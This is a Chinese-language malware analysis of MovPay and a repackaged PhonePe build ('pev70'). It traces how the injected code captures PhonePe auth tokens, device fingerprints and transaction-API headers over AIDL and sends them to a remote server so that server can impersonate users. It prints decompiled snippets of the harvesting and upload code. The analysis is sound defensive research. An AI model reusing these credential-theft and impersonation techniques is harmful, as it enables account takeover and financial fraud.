# IPayService.getPayListByTimeStamp 实现分析

> 核心问题：MovPay 如何通过 pev70 获取 PhonePe 的交易记录（PayList）？

---

## 1. 结论先行

**`getPayList()` 和 `getPayListByTimeStamp()` 在 pev70 中返回空字符串——PhonePe 的交易记录不是通过这两个 AIDL 方法获取的。**

MovPay 获取 PhonePe 交易记录的实际路径是：
1. 通过 `getRequestMeta()` 窃取完整的认证凭证（Token + 设备指纹 + HTTP Headers）
2. 将凭证传给 MovPay 服务端
3. 服务端**冒充用户身份**直接调用 PhonePe 的交易历史 API（`/apis/tstore/v2/units/changes`）

下面是完整的推理链条。

---

## 2. 从 AIDL 接口定义出发

### 2.1 IPayService.java — AIDL 接口定义

**文件位置**（两端都有）：
- pev70 端：`pev70_jadx/sources/com/longfafa/pay/IPayService.java`
- MovPay 端：`mov4.5.3_jadx/sources/com/longfafa/pay/IPayService.java`

```java
// 接口定义（com.longfafa.pay.IPayService）
public interface IPayService extends IInterface {
    String ping();                                    // 事务ID 1
    String onEvent(String name, String key, String value); // 事务ID 2
    String setPayBack(IPayBack callback);             // 事务ID 3
    String getPayList(int page, int size);            // 事务ID 4
    String getUPIList();                              // 事务ID 5
    String getRequestMeta();                          // 事务ID 6
    String getPayListByTimeStamp(long start, long end); // 事务ID 7
    String getUPIRequestMeta();                       // 事务ID 8
}
```

这是一个统一的 AIDL 接口，设计用于 MovPay 跨进程调用**多种钱包**的注入代码。

### 2.2 pev70 端的实现 — 返回空字符串

**文件**：`pev70_jadx/sources/com/longfafa/paylib/JobService.java`，第 119-127 行

```java
@Override
public String getPayList(int i, int i7) {
    return "";  // ← 空实现
}

@Override
public String getPayListByTimeStamp(long j, long j2) {
    return "";  // ← 空实现
}
```

**结论**：pev70 明确不通过 `getPayList`/`getPayListByTimeStamp` 返回任何交易数据。

### 2.3 对比：其他方法有完整实现

同一文件中，其他方法有完整逻辑：

| 方法 | 实现 | 返回内容 |
|------|------|----------|
| `ping()` | `return "pong-70"` | 版本号确认 |
| `getUPIList()` | 调用 `PhonePeHelper.getUPIs()` | 完整的 UPI 账户 JSON 列表 |
| `getRequestMeta()` | 调用 `PhonePeHelper.getRequestMetaInfoObj()` | 完整的认证凭证 JSON |
| `getUPIRequestMeta()` | 调用 `PhonePeHelper.getUPIRequestMetaInfo()` | UPI 专用认证元数据 |
| `onEvent("init",...)` | 调用 `PhonePeHelper.getUserPhoneNum()` | UserInfo (登录状态+手机号) |
| **`getPayList()`** | **`return ""`** | **空字符串** |
| **`getPayListByTimeStamp()`** | **`return ""`** | **空字符串** |

---

## 3. MovPay 端的调用逻辑

### 3.1 AIDL 绑定流程

**文件**：`mov4.5.3_jadx/sources/com/rupeerush/main/MainActivity.java`

```java
// HashMap f863i: appType -> IPayService (已连接的 AIDL 服务)
// HashMap f864j: appType -> ServiceConnection

public final void k(String str) {  // 绑定服务
    Intent intent = new Intent();
    intent.setAction("com.longfafa.pay.BIND_SERVICE");
    intent.setPackage(s.q.c(str));  // 将 appType 映射为包名
    bindService(intent, new m(this, str), flags);
}
```

**appType → 包名映射**（`s/o.java`）：

```java
put("phonepe",    "com.phonepe.app");
put("paytm",      "net.one97.paytm");
put("mobikwik",   "com.mobikwik_new");
put("freecharge", "com.freecharge.android");
put("myjio",      "com.jio.myjio");
put("airtela",    "com.myairtelapp");
put("navi",       "com.naviapp");
put("plugin",     "com.longhaha.plugin");
```

### 3.2 绑定成功后的 ServiceConnection

**文件**：`mov4.5.3_jadx/sources/com/rupeerush/main/m.java`

```java
public final void onServiceConnected(ComponentName componentName, IBinder iBinder) {
    IPayService iPayService = IPayService.Stub.asInterface(iBinder);
    // 发送邀请码事件
    iPayService.onEvent("log", "invitecode", mainActivity.f861g);
    // 存入 HashMap，供后续调用
    mainActivity.f863i.put(str2, iPayService);
    // 设置回调
    iPayService.setPayBack(new l(this));
}
```

### 3.3 getPayList 的实际调用

**文件**：`mov4.5.3_jadx/sources/com/rupeerush/main/e.java`（Runnable，case 0）

这是从 Flutter/Dart 层触发的调用链：

```java
// case 0: Flutter 侧请求获取 PayList
String str = appType;  // 如 "phonepe"

// 第一步：验证App签名
if (s.q.a(mainActivity, str)) {
    // 第二步：绑定 AIDL 服务
    new Thread(new d(mainActivity, str, 5)).start();  // 调用 k() 绑定

    // 等待绑定完成 (最多300ms)
    while (map.get(str) == null && i3 < 3) {
        Thread.sleep(100);
        i3++;
    }

    // 第三步：在新线程中获取 PayList
    StringBuilder sb = new StringBuilder();
    new Thread(new h(mainActivity, str, sb, this.d, 1)).start();

    // 等待结果 (超时时间按钱包类型不同)
    int timeout = "paytm".equals(str) ? 290 :
                  "mobikwik".equals(str) ? 50 : 190;
    for (int i5 = 0; sb.length() == 0 && i5 < timeout; i5++) {
        Thread.sleep(100);  // 每100ms检查一次
    }

    string = sb.length() == 0 ? "[]" : sb.toString();
}

// 第四步：返回结果给 Flutter
mainActivity.runOnUiThread(new f(uVar, string, 9));
```

### 3.4 h.java — 按钱包类型分发 PayList 请求

**文件**：`mov4.5.3_jadx/sources/androidx/media3/exoplayer/audio/h.java`（混淆到 media3 包中隐藏真实用途）

**完整的 case 1 逻辑**：

```java
// case 1: 获取 PayList
IPayService iPayService = map.get(str);      // 获取 AIDL 服务代理
String strOnEvent = iPayService.onEvent("init", "", "");  // 获取 UserInfo
Boolean isLoggedIn = new UserInfo(strOnEvent).login;

if (isLoggedIn) {
    if ("phonepe".equals(str)) {
        sb.append(iPayService.getPayList(0, 10));        // ← PhonePe: 返回 ""
    } else if ("airtela".equals(str)) {
        sb.append(iPayService.getPayList(0, 20));        // Airtel: 20条
    } else if ("paytm".equals(str)) {
        sb.append(iPayService.getPayList(0, 5));         // Paytm: 5条
    } else if ("mobikwik".equals(str)) {
        // MobiKwik 使用时间戳查询
        long now = Instant.now().toEpochMilli();
        long thirtyMinAgo = Instant.now().minus(30, ChronoUnit.MINUTES).toEpochMilli();

        // 如果 str2 有值（服务端下发的参考时间戳），以其为中心 ±15分钟/±3分钟
        long referenceTime = Long.parseLong(str2);
        if (referenceTime > 0) {
            now = referenceTime + 900000;      // + 15分钟
            thirtyMinAgo = referenceTime - 180000;  // - 3分钟
        }

        sb.append(iPayService.getPayListByTimeStamp(now, thirtyMinAgo));  // 按时间查
    } else {
        sb.append(iPayService.getPayList(0, 10));        // 其他: 10条
    }

    y.q("getPayListBack2", sb.toString());  // 记录到事件日志
}
```

**关键观察**：
- **PhonePe** 调用 `getPayList(0, 10)` → pev70 返回 `""` → sb 最终为 `""`
- **MobiKwik** 调用 `getPayListByTimeStamp(start, end)` → 可能其注入包有实际实现
- 所有结果通过 `y.q("getPayListBack2", ...)` 记录到事件日志系统

### 3.5 y.q() — 事件上报到服务器

**文件**：`mov4.5.3_jadx/sources/W/y.java`，第 297 行

```java
public static void q(String str, String str2) {
    // Debug 模式才打印到 Logcat
    if ((f1334a.getApplicationInfo().flags & 2) != 0) {
        Log.e("------1", str + "=" + str2);
    }
    // 插入本地 SQLite 数据库
    c.m(new C0190a(AbstractC0189b.a(), str, str2, System.currentTimeMillis()));
    // 触发上传线程
    t();
}
```

`y.q()` 将事件存入 `operateinfo.db` 数据库，然后由后台线程（`com/rupeerush/main/o.java` case 1）从数据库取出 → 序列化为 `ELog` → 通过 `s.m.d()` HTTP POST 到远程服务器。

---

## 4. PayInfo 数据模型 — 存在但未使用

**文件**：`pev70_jadx/sources/com/longfafa/paylib/pojo/PayInfo.java`

```java
public class PayInfo extends BasePoJo {
    @FieldDesc(key = "txnId")          public String txnId;
    @FieldDesc(key = "txnDate")        public String txnDate;
    @FieldDesc(key = "amount")         public String amount;
    @FieldDesc(key = "state")          public String state;
    @FieldDesc(key = "utr")            public String utr;      // UPI 交易参考号
    @FieldDesc(key = "payAccount")     public String payAccount;
    @FieldDesc(key = "reciveAccount")  public String reciveAccount;
    @FieldDesc(key = "payBankNumber")  public String PayBankNumber;
    @FieldDesc(key = "receiveBankNumber") public String ReceiveBankNumber;
    @FieldDesc(key = "description")    public String description;
    @FieldDesc(key = "remark")         public String remark;
    @FieldDesc(key = "flowType")       public Integer flowType;
    @FieldDesc(key = "showId")         public String showId;
    @FieldDesc(key = "appType")        public String appType;
}
```

这个数据模型定义了完整的交易记录结构，包含交易ID、金额、状态、UTR、付款/收款账号等。**但在 pev70 的代码中，`PayInfo` 没有被任何地方构造或填充** — `getPayList()` 直接返回空字符串，跳过了整个数据填充逻辑。

这说明 `PayInfo` 是为**其他钱包**（如 MobiKwik、Paytm）的注入版本设计的通用数据模型，这些钱包的注入代码可能会直接读取本地交易数据库并填充 `PayInfo` 对象返回给 MovPay。

---

## 5. PhonePe 的实际交易记录获取机制

既然 `getPayList()` 返回空，PhonePe 的交易记录是如何被获取的？

### 5.1 getRequestMeta() — 窃取完整认证凭证

**文件**：`pev70_jadx/sources/com/PhonePeTweak/Def/PhonePeHelper.java`，第 1421 行

`getRequestMetaInfoObj()` 返回的 JSON 包含：

```json
{
    "userId": "user_xxx",                     // 用户 ID
    "phoneNumber": "91xxxxxxxxxx",            // 手机号
    "deviceId": "xxxxxxxx",                   // PhonePe 设备 ID
    "deviceFingerprint": "加密的设备指纹",      // X-Device-Fingerprint
    "headers": {                              // 所有必需的 HTTP 请求头
        "X-APP-ID": "...",
        "X-MERCHANT-ID": "...",
        "X-SOURCE-VERSION": "...",
        "X-DG-G": "...",
        "X-DG-CA": "1",
        "X-SOURCE-LOCALE": "en"
    },
    "token": {                                // 1FA Token (一级认证)
        "token": "eyJhbGciOi...",
        "refreshToken": "...",
        "expiry": 1234567890
    },
    "authToken": {...},                       // Auth Token
    "ssoToken": {...},                        // SSO Token
    "accountsToken": {...},                   // Accounts Token
    "tokenMigrationEnabled": true,
    "tokenMigrationSuccessful": true,
    "mobileSummary": {...},                   // 设备摘要
    "hardwareDetails": {...},                 // 硬件详情
    "networkContext": {...},                   // 网络环境
    "mobileVerificationUtils": {...},         // 手机验证工具信息
    "phonePeManifest": {...},                 // PhonePe 清单
    "simInfoProvider": {...},                 // SIM 卡信息
    "displayPhoneNumber": {...},              // 显示手机号
    "networkStatus": {...},                   // 网络状态
    "mobileDetails": {...},                   // 设备移动详情
    "location": {...},                        // 位置信息
    "profileUserMappingRequest": {...},       // 用户映射请求
    "baseRequestBuilder": {...},              // 基础请求构建器配置
    "guardianContextStr": "..."              // Guardian 安全上下文
}
```

### 5.2 Headers 的专门捕获 — 瞄准交易 API

**文件**：`PhonePeHelper.java`，第 1608-1625 行

```java
// 专门从交易 API 的请求中截取 HTTP Headers
public static void printHeaders(String str, Request.Builder builder) {
    if (str == null || !str.contains("/apis/tstore/v2/units/changes")) {
        return;  // 只关注交易 API 的 headers
    }
    Headers headersBuild = builder.getHeaders().build();
    if (headers == null) {
        headers = headersBuild;
        saveHeadersToSH(headersBuild);  // 保存到 SharedPreferences
    }
}

public static void printHeadersV2(String str, Headers headers2) {
    if (str != null && str.contains("/apis/tstore/v2/units/changes") && headers == null) {
        headers = headers2;
        saveHeadersToSH(headers2);
    }
}
```

**这两个方法明确表明**：
- `/apis/tstore/v2/units/changes` 是 PhonePe 的**交易记录变更 API**
- 注入代码**专门捕获**发往这个 API 的 HTTP Headers
- Headers 被保存到 SharedPreferences（`headers_info`）以供后续使用

### 5.3 getMetaInfo() — 构造伪装请求头

**文件**：`PhonePeHelper.java`，第 1669 行

```java
public static JSONObject getMetaInfo() {
    // 从 PhonePe 的 SharedPreferences 读取服务端标识
    SharedPreferences sp = getContext().getSharedPreferences("networkPreferences", 0);
    String appId = sp.getString("key_header_app_id", "");
    String merchantId = sp.getString("key_header_merchant_id", "");
    String version = sp.getInt("key_header_version", 0);

    JSONObject headers = new JSONObject();
    headers.put("X-APP-ID", appId);
    headers.put("X-MERCHANT-ID", merchantId);
    headers.put("X-SOURCE-VERSION", version);
    headers.put("X-DG-G", GetG1());     // Guardian 安全参数
    headers.put("X-DG-CA", "1");
    headers.put("X-SOURCE-LOCALE", "en");
    return headers;
}
```

---

## 6. 完整推理链：PhonePe 交易记录的获取路径

```
┌─────────────────────────────────────────────────────────────┐
│  MovPay Flutter UI                                          │
│  用户点击"获取交易记录"                                      │
└──────────────┬──────────────────────────────────────────────┘
               │ Flutter MethodChannel
               ▼
┌─────────────────────────────────────────────────────────────┐
│  com.rupeerush.main.e (case 0)                              │
│  1. 验证App签名 s.q.a()                                     │
│  2. 绑定 AIDL 服务: action="com.longfafa.pay.BIND_SERVICE"  │
│     package="com.phonepe.app"                               │
│  3. 等待连接 (最多300ms)                                     │
└──────────────┬──────────────────────────────────────────────┘
               │ AIDL IPC (跨进程)
               ▼
┌─────────────────────────────────────────────────────────────┐
│  androidx.media3.exoplayer.audio.h (case 1)                 │
│  (混淆到 media3 包中隐藏真实用途)                             │
│                                                             │
│  if ("phonepe".equals(str)) {                               │
│      sb.append(iPayService.getPayList(0, 10));              │
│      // ↓ 调用 pev70 的 JobService                          │
│  }                                                          │
└──────────────┬──────────────────────────────────────────────┘
               │ AIDL Binder
               ▼
┌─────────────────────────────────────────────────────────────┐
│  pev70: com.longfafa.paylib.JobService.IPayServiceBinder    │
│                                                             │
│  getPayList(0, 10) → return ""   ← 空实现！                 │
│  getPayListByTimeStamp() → return ""   ← 空实现！           │
│                                                             │
│  但这些方法有完整实现：                                       │
│  ✓ getRequestMeta() → 完整认证凭证                          │
│  ✓ getUPIList() → 完整UPI账户列表                            │
│  ✓ getUPIRequestMeta() → UPI认证元数据                      │
└──────────────┬──────────────────────────────────────────────┘
               │
               │  getPayList 返回空，但 MovPay 另有途径
               │
               ▼
┌─────────────────────────────────────────────────────────────┐
│  MovPay 服务端 (推断的后端行为)                                │
│                                                             │
│  使用 getRequestMeta() 返回的凭证：                          │
│  • 1FA Token (Bearer 认证)                                  │
│  • Device Fingerprint (X-Device-Fingerprint)                │
│  • HTTP Headers (X-APP-ID, X-MERCHANT-ID 等)                │
│  • userId, phoneNumber                                      │
│                                                             │
│  构造请求 → PhonePe API 服务器                               │
│  GET /apis/tstore/v2/units/changes                          │
│  Authorization: Bearer <1fa_token>                          │
│  X-Device-Fingerprint: <stolen_fingerprint>                 │
│  X-APP-ID: <stolen_app_id>                                  │
│  ...                                                        │
│                                                             │
│  ← 返回完整交易历史记录                                      │
└─────────────────────────────────────────────────────────────┘
```

---

## 7. 为什么 PhonePe 不用 getPayList 而其他钱包用？

### 7.1 架构差异

| 钱包 | PayList 实现方式 | 原因推测 |
|------|-----------------|----------|
| **PhonePe** | `getPayList()` 返回空；通过凭证窃取 + 服务端 API 调用 | PhonePe 使用加密数据库（Room + 加密），本地交易数据难以直接读取 |
| **MobiKwik** | `getPayListByTimeStamp(start, end)` 有实现 | MobiKwik 可能有可直接读取的本地交易数据 |
| **Paytm** | `getPayList(0, 5)` 有实现 | Paytm 可能有明文 SharedPreferences 存储交易记录 |
| **Airtel** | `getPayList(0, 20)` 有实现 | Airtel 可能有可直接读取的本地存储 |

### 7.2 PhonePe 的替代策略

对于 PhonePe，攻击者采取了**更高级的策略**：

1. **不读取本地数据库**（可能因为加密或架构限制）
2. **窃取全部认证凭证**（Token + Headers + 设备指纹）
3. **由服务端冒充用户**直接调用 PhonePe 的 REST API
4. 这种方式能获取**更多、更完整**的交易数据，不受本地缓存限制

### 7.3 证据：PhonePeHelper 专门捕获交易 API Headers

`printHeaders()` 和 `printHeadersV2()` 方法**只关注** `/apis/tstore/v2/units/changes` 端点的 Headers — 这个端点就是 PhonePe 的交易记录 API。这证实了攻击者专门为服务端 API 调用收集必要的认证信息。

---

## 8. MobiKwik 的 getPayListByTimeStamp 时间窗口分析

虽然 PhonePe 不使用此方法，但 MovPay 对 MobiKwik 的调用逻辑值得分析：

```java
// 默认: 查询最近30分钟的交易
long now = Instant.now().toEpochMilli();
long thirtyMinAgo = now - 30 * 60 * 1000;

// 如果服务端下发了参考时间戳:
long referenceTime = Long.parseLong(str2);
if (referenceTime > 0) {
    now = referenceTime + 900000;       // 参考时间 + 15分钟
    thirtyMinAgo = referenceTime - 180000;  // 参考时间 - 3分钟
}

iPayService.getPayListByTimeStamp(now, thirtyMinAgo);
```

**这表明 MovPay 能精确查询特定时间窗口的交易**：
- 服务端知道用户何时发起了交易（通过 SOCKS5 代理流量监控或 OkHttp 拦截器日志）
- 下发参考时间戳 `str2`
- 以该时间为中心，查询 `-3分钟` 到 `+15分钟` 的交易
- 这个窗口足以捕获从交易发起到确认完成的全过程

---

## 9. getRequestMeta() 返回的完整凭证清单

以下是 MovPay 通过 `getRequestMeta()` 从 pev70 获取的所有数据字段：

```
认证 Token:
├── 1FA Token (token + refreshToken + expiry)
├── Auth Token
├── SSO Token
└── Accounts Token

设备身份:
├── userId
├── phoneNumber
├── deviceId (PhonePe 内部设备 ID)
├── deviceFingerprint (加密的 X-Device-Fingerprint)
└── androidId

HTTP 请求头:
├── X-APP-ID
├── X-MERCHANT-ID
├── X-SOURCE-VERSION
├── X-DG-G (Guardian 安全参数)
├── X-DG-CA
└── X-SOURCE-LOCALE

设备/环境信息:
├── mobileSummary
├── hardwareDetails
├── networkContext
├── networkStatus
├── mobileDetails
├── simInfoProvider
├── displayPhoneNumber
├── location
├── phonePeManifest
├── profileUserMappingRequest
├── baseRequestBuilder
├── guardianContextStr
└── mobileVerificationUtils
```

**有了这些数据，服务端可以完整伪造一个 PhonePe 客户端请求**，PhonePe 的后端无法区分这个请求来自真实客户端还是攻击者的服务器。

---

## 10. 事件日志上报通道 — y.q() 详解

无论 `getPayList` 返回什么，结果都通过 `y.q("getPayListBack2", result)` 上报：

```
y.q("getPayListBack2", result)
    │
    ├─→ 插入 SQLite (operateinfo.db, operateinfo 表)
    │   字段: _id, event_key, event_name, event_param, event_time
    │
    └─→ 触发上传线程 t()
         │
         └─→ com.rupeerush.main.o (case 1) 无限循环
              │
              ├─→ 从 SQLite 读取未上传事件
              ├─→ 序列化为 ELog (eventName + eventParam + appName + gaId + eventTime)
              ├─→ 通过 s.m.d() HTTP POST 到远程服务器
              └─→ 成功后从 SQLite 删除
```

**上报服务器**：通过 `com.rupeerush.utils.common.ServerUtils`（native `liblongfafa.so`）发送。

---

## 11. 总结

### PhonePe 交易记录获取的真实路径

```
                         pev70 (重打包 PhonePe)
                        ┌──────────────────────┐
                        │                      │
  PhonePe 用户操作 ────►│  Pine Hook 框架      │
  (登录、转账、查账)     │  ├─ OkHttp 拦截器    │──► 截获每一个 HTTP 请求/响应
                        │  ├─ Dagger DI 劫持    │──► 访问内部数据库和 Token
                        │  ├─ PIN/OTP 捕获      │──► 明文 PIN 和 OTP
                        │  └─ Header 捕获       │──► /apis/tstore/v2/units/changes
                        │                      │
                        │  AIDL 服务暴露:       │
                        │  ├ getPayList() = ""  │ ← 空实现（不在此获取交易列表）
                        │  ├ getRequestMeta()   │ ← ★ 返回全部认证凭证
                        │  ├ getUPIList()       │ ← ★ 返回 UPI 账户列表
                        │  └ getUPIRequestMeta()│ ← ★ 返回 UPI 认证元数据
                        └──────────┬───────────┘
                                   │ AIDL IPC
                                   ▼
                        ┌──────────────────────┐
                        │  MovPay              │
                        │  ├ 调用 getPayList() │──► 收到 "" (空)
                        │  ├ 调用 getRequestMeta()──► 收到完整凭证 ★
                        │  └ 上报到服务器       │
                        └──────────┬───────────┘
                                   │ HTTP POST (liblongfafa.so)
                                   ▼
                        ┌──────────────────────┐
                        │  远程服务器           │
                        │                      │
                        │  使用窃取的凭证       │
                        │  冒充用户直接调用      │
                        │  PhonePe REST API     │
                        │                      │
                        │  GET /apis/tstore/    │
                        │  v2/units/changes     │──► PhonePe 服务器返回交易记录
                        └──────────────────────┘
```

### 核心发现

1. **`getPayList()`/`getPayListByTimeStamp()` 在 pev70 中是空实现**，返回 `""`
2. **`PayInfo` 数据模型存在但未被使用** — 它是为其他钱包（MobiKwik/Paytm/Airtel）设计的
3. **PhonePe 的交易记录通过凭证窃取 + 服务端 API 调用获取**，不经过本地 AIDL 接口
4. `getRequestMeta()` 返回的凭证**完整到足以伪造任何 PhonePe API 请求**
5. `PhonePeHelper.printHeaders()` **专门针对** `/apis/tstore/v2/units/changes`（交易历史 API）收集 Headers
6. 这种**服务端代理调用**方式比直接读取本地数据更强大 — 可以获取完整的交易历史，不受本地缓存大小限制
